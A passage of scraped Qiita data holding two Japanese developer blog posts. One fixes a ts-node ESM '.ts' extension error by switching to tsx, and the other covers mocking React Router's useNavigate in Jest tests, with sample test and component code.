fa-link\"></i></a>コマンドの意味を理解</h4>\n<ul data-sourcepos=\"12:1-15:0\">\n<li data-sourcepos=\"12:1-12:91\">\n<strong>npx</strong>：Node.jsのパッケージをインストールすることなく実行できる</li>\n<li data-sourcepos=\"13:1-13:210\">\n<strong>ts-node --esm</strong>：<code>ts-node</code>はTypeScriptファイルを直接実行できるツール（JavaScriptに変換してくれる）、<code>--esm</code>は「ESモジュールモードで実行してください」を指定</li>\n<li data-sourcepos=\"14:1-15:0\">\n<strong>./batch/index.ts</strong>：実行するファイルパス</li>\n</ul>\n<h1 data-sourcepos=\"16:1-16:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"17:1-17:156\">Node.jsはjavascriptを実行するプログラム、Node.jsは「.ts」がなんのファイルか認識できていなかったことが原因でした。</p>\n<p data-sourcepos=\"19:1-19:101\"><strong><code>ts-node --esm</code>でJavaScriptに変換して実行してくれるのでは？となりました。</strong></p>\n<ul data-sourcepos=\"21:1-25:0\">\n<li data-sourcepos=\"21:1-23:0\">\n<p data-sourcepos=\"21:3-22:203\"><code>--esm</code>で指定したESモジュールモードは、拡張子の扱いが厳格だそうです。<br>\n特に、import文など（<code>import {} from './module.js'</code>）では必ず拡張子の指定が必要になります。（CommonJSモードは<code>require('./module')</code>のように拡張子を省略できる）</p>\n</li>\n<li data-sourcepos=\"24:1-25:0\">\n<p data-sourcepos=\"24:3-24:146\">ts-nodeはコンパイル時に.tsを<code>.js</code>に変換しますが、コード内のインポート文の拡張子は自動的に修正しません</p>\n</li>\n</ul>\n<p data-sourcepos=\"26:1-26:136\">ファイル内で、import文を使用している場合、Node.jsはimport内の「.ts」を認識できず、エラーとなります</p>\n<h1 data-sourcepos=\"28:1-28:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"29:1-29:41\"><code>npx tsx ./batch/index.ts</code>で実行する</p>\n<p data-sourcepos=\"31:1-32:132\"><code>tsx</code>はTypeScriptをJavaScriptに自動的に変換してくれます。<br>\nまた、<code>ts-node --esm</code>では解決できないインポート文の拡張子問題なども自動的に解決してくれます。</p>\n<div data-sourcepos=\"34:1-38:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"35:1-37:104\"><strong>ファイル拡張子の「.tsx」とは違う</strong><br>\n今回使用したのはコマンドラインツールの「tsx」<br>\nJSX記法のTypeScriptバージョンの拡張子「.tsx」と全く同じ名前ですが異なります</p>\n</div>\n</div>\n<h1 data-sourcepos=\"41:1-41:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"42:1-42:102\">コマンドのtsxとJSX記法のtsxは違うよね？あっているよね？ってなりました。</p>\n<h1 data-sourcepos=\"44:1-44:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"45:1-45:15\"><iframe id=\"qiita-embed-content__8d6c04bfe23a6eacea668533cc8f6ae4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8d6c04bfe23a6eacea668533cc8f6ae4\" data-content=\"https%3A%2F%2Ftsx.is%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"47:1-47:37\"><iframe id=\"qiita-embed-content__e6fadabd290ec90f65139c15b00a44a9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e6fadabd290ec90f65139c15b00a44a9\" data-content=\"https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fts-node\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"49:1-49:31\"><iframe id=\"qiita-embed-content__65b66929116965783f3c5d0d4607bf59\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__65b66929116965783f3c5d0d4607bf59\" data-content=\"https%3A%2F%2Ftypestrong.org%2Fts-node%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\ntsファイルをコマンドで叩いて実行する際に、表題のエラーになりました。\n解決に時間がかかってしまったため、備忘録としてまとめます。\n\n# 問題\n`npx ts-node --esm ./batch/index.ts `コマンドを実行すると`TypeError [ERR_UNKNOWN_FILE_EXTENSION]: Unknown file extension \".ts\" for`が発生する\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2ddbb307-c221-444a-9674-6ba7f82e6737.png)\n\n#### コマンドの意味を理解\n\n* **npx**：Node.jsのパッケージをインストールすることなく実行できる\n* **ts-node --esm**：`ts-node`はTypeScriptファイルを直接実行できるツール（JavaScriptに変換してくれる）、`--esm`は「ESモジュールモードで実行してください」を指定\n* **./batch/index.ts**：実行するファイルパス\n\n# 原因\nNode.jsはjavascriptを実行するプログラム、Node.jsは「.ts」がなんのファイルか認識できていなかったことが原因でした。\n\n**`ts-node --esm`でJavaScriptに変換して実行してくれるのでは？となりました。**\n\n* `--esm`で指定したESモジュールモードは、拡張子の扱いが厳格だそうです。\n特に、import文など（`import {} from './module.js'`）では必ず拡張子の指定が必要になります。（CommonJSモードは`require('./module')`のように拡張子を省略できる）\n\n* ts-nodeはコンパイル時に.tsを`.js`に変換しますが、コード内のインポート文の拡張子は自動的に修正しません\n\nファイル内で、import文を使用している場合、Node.jsはimport内の「.ts」を認識できず、エラーとなります\n\n# 解決方法\n`npx tsx ./batch/index.ts`で実行する\n\n`tsx`はTypeScriptをJavaScriptに自動的に変換してくれます。\nまた、`ts-node --esm`では解決できないインポート文の拡張子問題なども自動的に解決してくれます。\n\n:::note warn\n**ファイル拡張子の「.tsx」とは違う**\n今回使用したのはコマンドラインツールの「tsx」\nJSX記法のTypeScriptバージョンの拡張子「.tsx」と全く同じ名前ですが異なります\n:::\n\n\n# おわりに\nコマンドのtsxとJSX記法のtsxは違うよね？あっているよね？ってなりました。\n\n# 参考\nhttps://tsx.is/\n\nhttps://www.npmjs.com/package/ts-node\n\nhttps://typestrong.org/ts-node/\n","coediting":false,"comments_count":0,"created_at":"2025-05-11T19:47:32+09:00","group":null,"id":"b2eaeb45ee61dfd3f20e","likes_count":4,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"TypeScript","versions":[]},{"name":"TSX","versions":[]}],"title":"【TypeScript】TypeError [ERR_UNKNOWN_FILE_EXTENSION]: Unknown file extension \".ts\" forエラーが発生する","updated_at":"2025-05-11T19:49:03+09:00","url":"https://qiita.com/asa129/items/b2eaeb45ee61dfd3f20e","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":1310,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:243\">useNavigateを使用しているコンポネーントのテストを行う際に、useNavigateのモック化が理解できず、テスト実行時にエラーとなりました。useNavigateのモック化方法をまとめてみました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:98\">useNavigateのモック化してテスト実行すると下記のエラーが発生しました。</p>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"7:1-29:3\"><div class=\"highlight\"><pre><code>● UserCard › 戻るボタンをクリックすると/に遷移すること\n    expect<span class=\"o\">(</span>jest.fn<span class=\"o\">())</span>.toHaveBeenCalledWith<span class=\"o\">(</span>...expected<span class=\"o\">)</span>\n    Expected: <span class=\"s2\">\"/\"</span>\n    Received\n           1: called with 0 arguments\n           2: called with 0 arguments\n    Number of calls: 2\n      84 |     await userEvent.click<span class=\"o\">(</span>removeButton<span class=\"o\">)</span><span class=\"p\">;</span>\n      85 |\n    <span class=\"o\">&gt;</span> 86 |     expect<span class=\"o\">(</span>useNavigate<span class=\"o\">)</span>.toHaveBeenCalledWith<span class=\"o\">(</span><span class=\"s2\">\"/\"</span><span class=\"o\">)</span><span class=\"p\">;</span>\n         |                         ^\n      87 |   <span class=\"o\">})</span><span class=\"p\">;</span>\n      88 | <span class=\"o\">})</span><span class=\"p\">;</span>\n      89 |\n      at Object.&lt;anonymous&gt; <span class=\"o\">(</span>src/tests/userCardComponent.spec.tsx:86:25<span class=\"o\">)</span>\n PASS  src/tests/sampleComponent.spec.tsx\n\nTest Suites: 1 failed, 1 passed, 2 total                                                                                                                                                                                  \nTests:       1 failed, 7 passed, 8 total\nSnapshots:   0 total\nTime:        1.923 s\n</code></pre></div></div>\n<h1 data-sourcepos=\"31:1-31:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"32:1-32:73\"><code>useNavigate</code>自体をモック関数にしてしまっていました。</p>\n<h3 data-sourcepos=\"34:1-34:58\">\n<span id=\"react-router-の-usenavigate-は-関数を返す関数\" class=\"fragment\"></span><a href=\"#react-router-%E3%81%AE-usenavigate-%E3%81%AF-%E9%96%A2%E6%95%B0%E3%82%92%E8%BF%94%E3%81%99%E9%96%A2%E6%95%B0\"><i class=\"fa fa-link\"></i></a>React Router の useNavigate は 関数を返す関数</h3>\n<p data-sourcepos=\"35:1-35:94\"><code>useNavigate</code>は関数を返す関数であることを理解できていませんでした。</p>\n<p data-sourcepos=\"37:1-37:128\">テスト対象のコンポーネントでは確かに返却された関数をnavigateに格納して使用していました。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"39:1-54:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">navigate</span> <span class=\"o\">=</span> <span class=\"nf\">useNavigate</span><span class=\"p\">();</span> <span class=\"c1\">// useNavigateで返却された関数をnavigateに格納</span>\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">UserCard</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;</span><span class=\"nc\">Button</span>\n      <span class=\"na\">w</span><span class=\"p\">=</span><span class=\"s\">\"100%\"</span>\n      <span class=\"na\">mt</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">4</span><span class=\"si\">}</span>\n      <span class=\"na\">colorScheme</span><span class=\"p\">=</span><span class=\"s\">\"teal\"</span>\n      <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"remove-button\"</span>\n      <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">navigate</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">/</span><span class=\"dl\">\"</span><span class=\"p\">)</span><span class=\"si\">}</span>  <span class=\"c1\">// navigateで実行！</span>\n    <span class=\"p\">&gt;</span>\n      戻る\n    <span class=\"p\">&lt;/</span><span class=\"nc\">Button</span><span class=\"p\">&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">};</span>\n</code></pre></div></div>\n<p data-sourcepos=\"56:1-56:33\">実際に書いていたテスト</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"57:1-62:3\"><div class=\"highlight\"><pre><code><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"p\">...</span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">requireActual</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n  <span class=\"na\">useNavigate</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span> <span class=\"c1\">// これだとuseNavigate()がモック関数になり、使用時はundefinedを返す</span>\n<span class=\"p\">}));</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"64:1-64:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"65:1-65:131\">モック関数（mockNavigate）を別途作り、useNavigateが呼ばれた際はモック関数を呼ぶようにしました。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"67:1-74:3\"><div class=\"highlight\"><pre><code><span class=\"hil\"><span class=\"o\">+</span><span class=\"kd\">const</span> <span class=\"nx\">mockNavigate</span> <span class=\"o\">=</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">();</span>\n</span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"p\">...</span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">requireActual</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"na\">useNavigate</span><span class=\"p\">:</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">mockNavigate</span><span class=\"p\">,</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>  <span class=\"na\">useNavigate</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n</span><span class=\"p\">}));</span>\n</code></pre></div></div>\n<ol data-sourcepos=\"76:1-81:0\">\n<li data-sourcepos=\"76:1-76:49\">mockNavigate というモック関数を作成</li>\n<li data-sourcepos=\"77:1-77:192\">\n<code>...jest.requireActual(\"react-router\"),</code>：<code>jest.requireActual(\"react-router\")</code>でreact-routerの全てのモジュールをエクスポート、<code>...</code>（スプレッド構文）でコピー</li>\n<li data-sourcepos=\"78:1-78:77\">useNavigate が呼ばれたときに mockNavigate を返すようにする</li>\n<li data-sourcepos=\"79:1-79:124\">コンポーネントでは const navigate = useNavigate() と書かれており、navigate には mockNavigate が入る</li>\n<li data-sourcepos=\"80:1-81:0\">navigate(\"/\") が呼ばれると、実際には mockNavigate(\"/\") が実行される</li>\n</ol>\n<p data-sourcepos=\"82:1-82:13\"><strong>完成系</strong></p>\n<details><summary>テストコード</summary>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"86:1-128:3\">\n<div class=\"code-lang\"><span class=\"bold\">test.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../utils/supabaseFunctions</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">getUserById</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">mockNavigate</span> <span class=\"o\">=</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">();</span>\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"p\">...</span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">requireActual</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n  <span class=\"na\">useNavigate</span><span class=\"p\">:</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">mockNavigate</span><span class=\"p\">,</span>\n<span class=\"p\">}));</span>\n\n<span class=\"c1\">// モックデータを作成</span>\n<span class=\"kd\">const</span> <span class=\"nx\">mockUser</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">apple</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">テストユーザー</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">description</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">&lt;p&gt;テストユーザーの説明&lt;/p&gt;</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">skill_name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">React</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">github_id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">testuser</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">qiita_id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">testuser</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">x_id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">testuser</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">getGithubUrl</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"dl\">\"</span><span class=\"s2\">https://github.com/testuser</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n  <span class=\"na\">getQiitaUrl</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"dl\">\"</span><span class=\"s2\">https://qiita.com/testuser</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n  <span class=\"na\">getXUrl</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"dl\">\"</span><span class=\"s2\">https://x.com/testuser</span><span class=\"dl\">\"</span><span class=\"p\">),</span>\n<span class=\"p\">};</span>\n\n<span class=\"nf\">beforeEach</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">clearAllMocks</span><span class=\"p\">();</span>\n  <span class=\"c1\">// DBから取得したデータをモックする</span>\n  <span class=\"p\">(</span><span class=\"nx\">getUserById</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span><span class=\"nx\">mockUser</span><span class=\"p\">]);</span>\n<span class=\"p\">});</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">UserCard</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">戻るボタンをクリックすると/に遷移すること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">UserCard</span> <span class=\"p\">/&gt;,</span> <span class=\"p\">{</span> <span class=\"na\">wrapper</span><span class=\"p\">:</span> <span class=\"nx\">BrowserRouter</span> <span class=\"p\">});</span>\n\n    <span class=\"c1\">// 戻るボタンをクリック</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">removeButton</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">remove-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">removeButton</span><span class=\"p\">);</span>\n\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">mockNavigate</span><span class=\"p\">).</span><span class=\"nf\">toHaveBeenCalledWith</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">/</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n</details>\n<details><summary>テスト対象のコンポーネント</summary>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"134:1-224:3\">\n<div class=\"code-lang\"><span class=\"bold\">UserCard.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useEffect</span><span class=\"p\">,</span> <span class=\"nx\">useState</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useNavigate</span><span class=\"p\">,</span> <span class=\"nx\">useParams</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-router</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">getUserById</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../utils/supabaseFunctions</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">User</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../domain/user</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">Box</span><span class=\"p\">,</span> <span class=\"nx\">Button</span><span class=\"p\">,</span> <span class=\"nx\">Card</span><span class=\"p\">,</span> <span class=\"nx\">CardBody</span><span class=\"p\">,</span> <span class=\"nx\">Heading</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@chakra-ui/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">IoLogoGithub</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-icons/io5</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">SiQiita</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-icons/si</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">RiTwitterXFill</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-icons/ri</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">UserCard</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">id</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nf\">useParams</span><span class=\"p\">();</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">loadingFlag</span><span class=\"p\">,</span> <span class=\"nx\">setLoadingFlag</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">user</span><span class=\"p\">,</span> <span class=\"nx\">setUser</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">useState</span><span class=\"o\">&lt;</span><span class=\"nx\">User</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span><span class=\"p\">();</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">navigate</span> <span class=\"o\">=</span> <span class=\"nf\">useNavigate</span><span class=\"p\">();</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">getData</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getUserById</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"o\">!</span><span class=\"p\">);</span>\n    <span class=\"nf\">setUser</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n    <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">!==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nf\">setLoadingFlag</span><span class=\"p\">(</span><span class=\"kc\">false</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">};</span>\n  <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">getData</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"p\">[]);</span>\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">loadingFlag</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"p\">&lt;</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>loading…<span class=\"p\">&lt;/</span><span class=\"nt\">h1</span><span class=\"p\">&gt;;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;</span><span class=\"nc\">Box</span>\n      <span class=\"na\">height</span><span class=\"p\">=</span><span class=\"s\">\"100vh\"</span>\n      <span class=\"na\">display</span><span class=\"p\">=</span><span class=\"s\">\"flex\"</span>\n      <span class=\"na\">flexDirection</span><span class=\"p\">=</span><span class=\"s\">\"column\"</span>\n      <span class=\"na\">alignItems</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span>\n      <span class=\"na\">justifyContent</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span>\n      <span class=\"na\">bg</span><span class=\"p\">=</span><span class=\"s\">\"#C4F1F9\"</span>\n    <span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">width</span><span class=\"p\">=</span><span class=\"s\">\"sm\"</span> <span class=\"na\">p</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">4</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n        <span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">?.</span><span class=\"nf\">map</span><span class=\"p\">((</span><span class=\"nx\">user</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n          <span class=\"k\">return </span><span class=\"p\">(</span>\n            <span class=\"p\">&lt;</span><span class=\"nc\">Card</span> <span class=\"na\">key</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"si\">}</span><span 